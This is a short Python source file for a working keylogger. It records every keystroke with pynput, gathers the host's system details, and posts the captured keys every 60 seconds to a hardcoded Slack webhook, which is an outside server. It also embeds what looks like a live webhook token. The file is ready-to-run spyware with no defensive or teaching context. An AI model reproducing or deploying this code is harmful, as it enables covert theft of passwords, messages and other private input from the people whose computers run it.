from pynput.keyboard import Listener
from threading import Timer
import requests
import json
import platform

WEBHOOK = 'https://hooks.slack.com/services/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'

TIME_INTERVAL = 60


class Keylogger:
    def __init__(self, webhook_url, interval=60):
        self.interval = interval
        self.webhook = webhook_url
        self.log = ""
        my_system = platform.uname()
        info = ''
        info += f"System: {my_system.system}\n"
        info += f"Node Name: {my_system.node}\n"
        info += f"Release: {my_system.release}\n"
        info += f"Version: {my_system.version}\n"
        info += f"Machine: {my_system.machine}\n"
        info += f"Processor: {my_system.processor}\n"
        payload = {"text": info}
        requests.post(self.webhook, json.dumps(payload))

    def _report(self):
        if self.log != '':
            payload = {"text": self.log}
            requests.post(self.webhook, json.dumps(payload))
            self.log = ''
        Timer(self.interval, self._report).start()

    def _on_key_press(self, key):
        k = str(key)
        if len(k) > 4:
            if 'Key.space' in k:
                self.log += ' '
            else:
                self.log += ' '+str(key)+' '
        else:
            self.log += k[1]

    def run(self):
        self._report()
        with Listener(self._on_key_press) as t:
            t.join()


if __name__ == '__main__':
    Keylogger(WEBHOOK, TIME_INTERVAL).run()
# Key.(?!backspace\b)\b\w+
